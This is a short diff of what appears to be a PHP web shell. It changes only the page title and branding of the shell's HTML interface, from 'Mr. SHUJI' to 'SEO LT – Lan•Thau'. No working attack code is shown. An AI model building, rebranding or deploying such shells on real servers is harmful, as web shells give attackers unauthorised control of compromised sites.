@@ -276,7 +276,7 @@ $Array = [
 	echo "
 	<html>
 	<head>
-		<title>Shell Mr. SHUJI</title>
+		<title>Shell SEO LT – Lan•Thau</title>
 		<meta charset='UTF-8'>
 		<meta name='author' content='SEO LT – Lan•Thau'>
 		<meta name='viewport' content='width=device-width, initial-scale=0.70'>
